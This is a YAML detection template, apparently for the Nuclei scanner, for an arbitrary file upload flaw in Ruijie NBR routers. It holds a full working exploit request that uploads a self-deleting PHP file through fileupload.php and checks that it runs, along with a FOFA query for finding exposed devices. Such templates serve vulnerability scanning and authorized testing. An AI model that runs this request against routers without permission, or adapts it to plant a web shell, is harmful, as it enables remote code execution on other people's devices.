http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1,"jsonrpc")
    - status_code_2 == 200 && contains(body_2,"{{string}}")
    type: dsl
  raw:
  - 'POST /ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/plain, */*; q=0.01

    Content-Disposition: form-data; name="file"; filename="{{filename}}.php"

    Content-Type: image/jpeg


    <?php echo "{{string}}"; unlink(__FILE__); ?>

    '
  - 'GET /ddi/server/upload/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: ruijie-nbr-fileupload
info:
  author: SleepingBag945
  description: 'Ruijie NBR router fileupload.php file has an arbitrary file upload
    vulnerability. An attacker can upload any file to the server through the vulnerability
    to obtain server permissions.

    '
  metadata:
    fofa-query: "app=\"Ruijie-NBR\u8DEF\u7531\u5668\""
    max-request: 2
    verified: true
  name: Ruijie NBR fileupload.php - Arbitrary File Upload
  reference:
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/ruijie-nbr-fileupload.yaml
  severity: critical
  tags: ruijie,file-upload,intrusive,nbr
variables:
  filename: '{{rand_base(6)}}'
  string: '{{rand_base(5)}}'
